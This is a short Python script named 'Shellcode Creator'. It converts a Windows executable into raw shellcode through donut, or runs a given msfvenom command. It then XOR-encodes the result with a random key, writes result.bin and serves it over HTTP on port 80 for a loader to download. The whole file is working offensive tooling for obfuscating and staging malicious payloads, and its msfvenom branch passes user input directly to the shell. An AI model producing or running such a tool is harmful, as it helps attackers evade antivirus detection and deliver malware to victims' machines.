import os
import sys
import argparse
from random import randint


parser = argparse.ArgumentParser(
    prog='Shellcode Creator',
    description='Creates RAW from PE by rewriting Entry.Point with loader/Creates RAW with msfvenom. RAW encoding: XOR',
    epilog='(c) Meb'
)
parser.add_argument('-p', '--path', metavar='', required=True, help="Path or command, depends on -t")
parser.add_argument('-t', '--type', metavar='', required=True, help="Type: msf/pe", choices=['msf', 'pe'], default='pe')
args = parser.parse_args()

pe_path = args.path

if args.type == 'pe':
	os.system(f'./donut {pe_path}')
elif args.type =='msf':
	os.system(f'{pe_path} > loader.bin')

d = open('./loader.bin', 'rb').read()
key = bytearray([randint(1, 126) for i in range(8)])
cipher = key*(len(d)//len(key)) + key[:len(d)%len(key)]
ciphertext = bytes(p^k for p,k in zip(d, cipher))

ciphertext = key + ciphertext
open('./result.bin', 'wb').write(ciphertext)
os.system('python3 -m http.server 80')

# plaintext = bytes(p^k for p,k in zip(ciphertext, cipher))  # a ^ b ^ b = a
